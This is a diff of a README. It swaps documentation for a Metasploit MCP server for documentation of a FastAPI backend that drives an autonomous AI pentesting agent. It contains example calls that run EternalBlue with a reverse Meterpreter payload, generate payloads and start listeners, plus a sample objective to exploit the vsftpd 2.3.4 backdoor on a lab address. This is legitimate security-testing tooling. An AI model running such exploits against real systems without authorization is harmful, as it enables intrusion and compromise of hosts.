@@ -1,322 +1,306 @@
-# Metasploit MCP Server
+# FastAPI Backend for Metasploit Pentester Agent
 
-A Model Context Protocol (MCP) server for Metasploit Framework integration.
+## Overview
 
+This FastAPI application wraps the LangChain + LangGraph + MetasploitMCP pentesting agent with HTTP endpoints and SSE streaming support. Connect a frontend to control the agent programmatically.
 
-https://github.com/user-attachments/assets/39b19fb5-8397-4ccd-b896-d1797ec185e1
+## Quick Start
 
-
-## Description
-
-This MCP server provides a bridge between large language models like Claude and the Metasploit Framework penetration testing platform. It allows AI assistants to dynamically access and control Metasploit functionality through standardized tools, enabling a natural language interface to complex security testing workflows.
-
-## Features
-
-### Module Information
-
-- **list_exploits**: Search and list available Metasploit exploit modules
-- **list_payloads**: Search and list available Metasploit payload modules with optional platform and architecture filtering
-
-### Exploitation Workflow
-
-- **run_exploit**: Configure and execute an exploit against a target with options to run checks first
-- **run_auxiliary_module**: Run any Metasploit auxiliary module with custom options
-- **run_post_module**: Execute post-exploitation modules against existing sessions
-
-### Payload Generation
-
-- **generate_payload**: Generate payload files using Metasploit RPC (saves files locally)
-
-### Session Management
-
-- **list_active_sessions**: Show current Metasploit sessions with detailed information
-- **send_session_command**: Run a command in an active shell or Meterpreter session
-- **terminate_session**: Forcefully end an active session
-
-### Handler Management
-
-- **list_listeners**: Show all active handlers and background jobs
-- **start_listener**: Create a new multi/handler to receive connections
-- **stop_job**: Terminate any running job or handler
-
-## Prerequisites
-
-- Metasploit Framework installed and msfrpcd running
-- Python 3.10 or higher
-- Required Python packages (see requirements.txt)
-
-## Installation
-
-1. Clone this repository
-2. Install dependencies:
-   ```
-   pip install -r requirements.txt
-   ```
-3. Configure environment variables (optional):
-   ```
-   MSF_PASSWORD=yourpassword
-   MSF_SERVER=127.0.0.1
-   MSF_PORT=55553
-   MSF_SSL=false
-   PAYLOAD_SAVE_DIR=/path/to/save/payloads  # Optional: Where to save generated payloads
-   ```
-
-## Usage
-
-Start the Metasploit RPC service:
+### 1. Install Dependencies
 
 ```bash
-msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
+pip install -r requirements.txt
 ```
 
-### Transport Options
+### 2. Start MetasploitMCP Server
 
-The server supports two transport methods:
-
-- **HTTP/SSE (Server-Sent Events)**: Default mode for interoperability with most MCP clients
-- **STDIO (Standard Input/Output)**: Used with Claude Desktop and similar direct pipe connections
-
-You can explicitly select the transport mode using the `--transport` flag:
+In one terminal, start the MetasploitMCP server:
 
 ```bash
-# Run with HTTP/SSE transport (default)
-python MetasploitMCP.py --transport http
-
-# Run with STDIO transport
-python MetasploitMCP.py --transport stdio
+python MetasploitMCP.py
 ```
 
-Additional options for HTTP mode:
+### 3. Start the API Server
+
+In another terminal, start the FastAPI server:
+
 ```bash
-python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
+uvicorn api:app --host 0.0.0.0 --port 8000 --reload
 ```
 
-### Claude Desktop Integration
+### 4. Run Tests
 
-For Claude Desktop integration, configure `claude_desktop_config.json`:
+```bash
+python test_api.py
+```
 
+## Configuration
+
+All configuration is loaded from `.env` (same file used by agent.py):
+
+| Variable | Default | Description |
+|----------|---------|-------------|
+| `MSF_MCP_URL` | `http://127.0.0.1:8085/sse` | MetasploitMCP server URL |
+| `MSF_LHOST` | `192.168.100.50` | Attacker IP |
+| `MSF_LPORT` | `4444` | Default callback port |
+| `MODEL` | `claude-haiku-4-5` | Anthropic model |
+| `RUN_TIMEOUT` | `300` | Agent run timeout (seconds) |
+| `SSE_TIMEOUT` | `120` | SSE read timeout (seconds) |
+
+## Endpoints
+
+### POST /run
+
+Run a pentest objective with SSE streaming.
+
+**Request:**
 ```json
 {
-    "mcpServers": {
-        "metasploit": {
-            "command": "uv",
-            "args": [
-                "--directory",
-                "C:\\path\\to\\MetasploitMCP",
-                "run",
-                "MetasploitMCP.py",
-                "--transport",
-                "stdio"
-            ],
-            "env": {
-                "MSF_PASSWORD": "yourpassword"
-            }
-        }
-    }
+  "objective": "exploit vsftpd 2.3.4 on 192.168.100.32"
 }
 ```
 
-### Other MCP Clients
+**Response:** Server-Sent Events (SSE)
 
-For other MCP clients that use HTTP/SSE:
-
-1. Start the server in HTTP mode:
-   ```bash
-   python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
-   ```
-
-2. Configure your MCP client to connect to:
-   - SSE endpoint: `http://your-server-ip:8085/sse`
-
-## Security Considerations
-
-⚠️ **IMPORTANT SECURITY WARNING**:
-
-This tool provides direct access to Metasploit Framework capabilities, which include powerful exploitation features. Use responsibly and only in environments where you have explicit permission to perform security testing.
-
-- Always validate and review all commands before execution
-- Only run in segregated test environments or with proper authorization
-- Be aware that post-exploitation commands can result in significant system modifications
-
-## Example Workflows
-
-### Basic Exploitation
-
-1. List available exploits: `list_exploits("ms17_010")`
-2. Select and run an exploit: `run_exploit("exploit/windows/smb/ms17_010_eternalblue", {"RHOSTS": "192.168.1.100"}, "windows/x64/meterpreter/reverse_tcp", {"LHOST": "192.168.1.10", "LPORT": 4444})`
-3. List sessions: `list_active_sessions()`
-4. Run commands: `send_session_command(1, "whoami")`
-
-### Post-Exploitation
-
-1. Run a post module: `run_post_module("windows/gather/enum_logged_on_users", 1)`
-2. Send custom commands: `send_session_command(1, "sysinfo")`
-3. Terminate when done: `terminate_session(1)`
-
-### Handler Management
-
-1. Start a listener: `start_listener("windows/meterpreter/reverse_tcp", "192.168.1.10", 4444)`
-2. List active handlers: `list_listeners()`
-3. Generate a payload: `generate_payload("windows/meterpreter/reverse_tcp", "exe", {"LHOST": "192.168.1.10", "LPORT": 4444})`
-4. Stop a handler: `stop_job(1)`
-
-## Testing
-
-This project includes comprehensive unit and integration tests to ensure reliability and maintainability.
-
-### Prerequisites for Testing
-
-Install test dependencies:
-
-```bash
-pip install -r requirements-test.txt
+```json
+{ "type": "tool_call", "content": "", "tool_name": "run_exploit", "tool_args": { ... } }
+{ "type": "tool_result", "content": "{\"status\": \"success\", ...}", "tool_name": null, "tool_args": null }
+{ "type": "ai_message", "content": "Exploiting target...", "tool_name": null, "tool_args": null }
+{ "type": "done", "content": "Execution complete", "tool_name": null, "tool_args": null }
 ```
 
-Or use the convenient installer:
+**Event Types:**
+- `tool_call` - Agent calling a tool
+- `tool_result` - Tool execution result
+- `ai_message` - Agent reasoning message
+- `error` - Error occurred
+- `done` - Execution complete
 
-```bash
-python run_tests.py --install-deps
-# OR
-make install-deps
+**Error Responses:**
+- `400` - Missing or empty objective
+- `503` - Agent not ready (MCP connection failed)
+
+### GET /sessions
+
+Get active Metasploit sessions.
+
+```json
+{
+  "sessions": {"1": {"id": "1", "type": "shell", ...}},
+  "count": 1
+}
 ```
 
-### Running Tests
+### DELETE /sessions
 
-#### Quick Commands
+Kill all active sessions and stop all jobs.
 
-```bash
-# Run all tests
-python run_tests.py --all
-# OR
-make test
-
-# Run with coverage report
-python run_tests.py --all --coverage
-# OR
-make coverage
-
-# Run with HTML coverage report
-python run_tests.py --all --coverage --html
-# OR
-make coverage-html
+```json
+{
+  "killed_sessions": ["1", "2"],
+  "stopped_jobs": ["1"]
+}
 ```
 
-#### Specific Test Suites
+### POST /cleanup
 
-```bash
-# Unit tests only
-python run_tests.py --unit
-# OR
-make test-unit
+One-click cleanup for frontend use. Kills all sessions and jobs.
 
-# Integration tests only  
-python run_tests.py --integration
-# OR
-make test-integration
-
-# Options parsing tests
-python run_tests.py --options
-# OR
-make test-options
-
-# Helper function tests
-python run_tests.py --helpers
-# OR
-make test-helpers
-
-# MCP tools tests
-python run_tests.py --tools
-# OR
-make test-tools
+```json
+{
+  "status": "ok",
+  "message": "All sessions and jobs cleared"
+}
 ```
 
-#### Test Options
+### GET /tools
 
-```bash
-# Include slow tests
-python run_tests.py --all --slow
+List available MCP tools.
 
-# Include network tests (requires actual network)
-python run_tests.py --all --network
-
-# Verbose output
-python run_tests.py --all --verbose
-
-# Quick test (no coverage, fail fast)
-make quick-test
-
-# Debug mode (detailed failure info)
-make test-debug
+```json
+{
+  "tools": [
+    {"name": "run_exploit", "description": "Run a Metasploit exploit module"},
+    {"name": "list_active_sessions", "description": "List all active sessions"}
+  ],
+  "count": 15
+}
 ```
 
-### Test Structure
+### GET /history
 
-- **`tests/test_options_parsing.py`**: Unit tests for the graceful options parsing functionality
-- **`tests/test_helpers.py`**: Unit tests for internal helper functions and MSF client management
-- **`tests/test_tools_integration.py`**: Integration tests for all MCP tools with mocked Metasploit backend
-- **`conftest.py`**: Shared test fixtures and configuration
-- **`pytest.ini`**: Pytest configuration with coverage settings
+Get current conversation history.
 
-### Test Features
-
-- **Comprehensive Mocking**: All Metasploit dependencies are mocked, so tests run without requiring an actual MSF installation
-- **Async Support**: Full async/await testing support using pytest-asyncio
-- **Coverage Reporting**: Detailed coverage analysis with HTML reports
-- **Parametrized Tests**: Efficient testing of multiple input scenarios
-- **Fixture Management**: Reusable test fixtures for common setup scenarios
-
-### Coverage Reports
-
-After running tests with coverage, reports are available in:
-
-- **Terminal**: Coverage summary displayed after test run
-- **HTML**: `htmlcov/index.html` (when using `--html` option)
-
-### CI/CD Integration
-
-For continuous integration:
-
-```bash
-# CI-friendly test command
-make ci-test
-# OR
-python run_tests.py --all --coverage --verbose
+```json
+{
+  "messages": [
+    {"type": "human", "content": "exploit vsftpd on 192.168.100.32"},
+    {"type": "ai", "content": "Running exploit..."}
+  ],
+  "count": 2
+}
 ```
 
-## Configuration Options
+### DELETE /history
 
-### Payload Save Directory
+Clear conversation history.
 
-By default, payloads generated with `generate_payload` are saved to a `payloads` directory in your home folder (`~/payloads` or `C:\Users\YourUsername\payloads`). You can customize this location by setting the `PAYLOAD_SAVE_DIR` environment variable.
+```json
+{ "cleared": true }
+```
 
-**Setting the environment variable:**
+### GET /health
 
-- **Windows (PowerShell)**:
-  ```powershell
-  $env:PAYLOAD_SAVE_DIR = "C:\custom\path\to\payloads"
-  ```
+Health check - is MetasploitMCP reachable?
 
-- **Windows (Command Prompt)**:
-  ```cmd
-  set PAYLOAD_SAVE_DIR=C:\custom\path\to\payloads
-  ```
+```json
+{
+  "status": "ok",
+  "tools_loaded": 15,
+  "mcp_url": "http://127.0.0.1:8085/sse"
+}
+```
 
-- **Linux/macOS**:
-  ```bash
-  export PAYLOAD_SAVE_DIR=/custom/path/to/payloads
-  ```
+### GET /status
 
-- **In Claude Desktop config**:
-  ```json
-  "env": {
-      "MSF_PASSWORD": "yourpassword",
-      "PAYLOAD_SAVE_DIR": "C:\\your\\actual\\path\\to\\payloads"  // Only add if you want to override the default
-  }
-  ```
+Get current agent status for frontend polling.
 
-**Note:** If you specify a custom path, make sure it exists or the application has permission to create it. If the path is invalid, payload generation might fail.
+```json
+{
+  "ready": true,
+  "tools_loaded": 15,
+  "history_length": 2,
+  "mcp_url": "http://127.0.0.1:8085/sse",
+  "model": "claude-haiku-4-5",
+  "lhost": "192.168.100.50",
+  "lport": "4444"
+}
+```
+
+## Bugs Fixed
+
+| Bug | Description |
+|-----|-------------|
+| BUG 1 | Sessions parsing now handles dict format with "sessions" and "count" fields |
+| BUG 2 | Lock acquired only at start/end of stream - doesn't block other requests |
+| BUG 3 | Uses Pydantic model `RunRequest` instead of raw Request |
+| BUG 4 | Returns 503 if agent is not ready before accepting /run requests |
+
+## Architecture
+
+```
+┌─────────────┐     ┌─────────────────┐     ┌──────────────────┐
+│   Frontend  │────▶│  FastAPI (api)  │────▶│ LangGraph Agent  │
+└─────────────┘     └─────────────────┘     └──────────────────┘
+         │                   │                        │
+         │         POST /run (SSE)                 │
+         │                   │              ┌───────┴────────┐
+         │                   │              │               │
+         │                   │        ┌─────▼────┐   ┌───▼────┐
+         │                   │        │ MCP Cli  │   │  LLM  │
+         │                   │        └─────────┘   └───────┘
+         │                   │              │
+         │          ┌────────┴─────────┐  │
+         │          │                 │  │
+         ▼          ▼                 ▼  ▼
+    GET /sessions              GET /tools    │
+    DELETE /sessions           GET /health   │
+    POST /cleanup            GET /status  │
+                           GET /history│
+                           DELETE /history
+
+┌────────────────────────────────────────────────────┐
+│           MetasploitMCP Server                      │
+│              (MetasploitMCP.py)                     │
+│          http://127.0.0.1:8085/sse                 │
+└────────────────────────────────────────────────────┘
+```
+
+## Files
+
+| File | Description |
+|------|-------------|
+| `api.py` | FastAPI application (9 endpoints) |
+| `test_api.py` | Test script with httpx |
+| `requirements.txt` | Python dependencies |
+| `README.md` | This documentation |
+| `agent.py` | Original CLI agent (Reference) |
+| `MetasploitMCP.py` | MCP server implementation |
+
+## Running with Different Configurations
+
+### Custom Port
+
+```bash
+uvicorn api:app --host 0.0.0.0 --port 9000
+```
+
+### Debug Mode
+
+```bash
+uvicorn api:app --host 0.0.0.0 --port 8000 --reload --log-level debug
+```
+
+### Using a Different Model
+
+```bash
+MODEL=claude-sonnet-4-20250514 uvicorn api:app --host 0.0.0.0 --port 8000 --reload
+```
+
+## Error Handling
+
+All errors are returned as SSE events with type `error`:
+
+```json
+{ "type": "error", "content": "TimeoutError: Run exceeded 300s timeout", "tool_name": null, "tool_args": null }
+```
+
+The server never crashes - errors are gracefully streamed back to the client.
+
+## Session Response Format
+
+The `/sessions` endpoint returns sessions as a dictionary (not a list):
+
+```json
+{
+  "sessions": {
+    "1": {
+      "id": "1",
+      "type": "shell",
+      "tunnel_remote": "192.168.100.32:4444",
+      "tunnel_local": "127.0.0.1:4444",
+      "via_exploit": "exploit/unix/ftp/vsftpd_234_backdoor",
+      "via_payload": "cmd/unix/shell_bind_tcp",
+      "info": "192.168.100.32:21 vsftpd 2.3.4",
+      "workspace": "default",
+      "session_host": "192.168.100.32",
+      "session_port": 4444,
+      "target_host": "192.168.100.32"
+    }
+  },
+  "count": 1
+}
+```
+
+## Thread Safety
+
+The conversation history is protected by `asyncio.Lock()` to ensure thread-safe access:
+- Lock acquired only to copy history at start of run
+- Agent streams WITHOUT the lock (doesn't block other requests)
+- Lock acquired only to save updated history at end of run
+
+## Development
+
+### Adding New Endpoints
+
+1. Add the endpoint to `api.py`
+2. Add test function to `test_api.py`
+3. Update this README
+
+### Modifying the System Prompt
+
+Edit `SYSTEM_PROMPT` in `api.py` to customize the agent behavior.
 
 ## License
 
-Apache 2.0
-# Vsec-MetasploitMcp
+See LICENSE file for details.
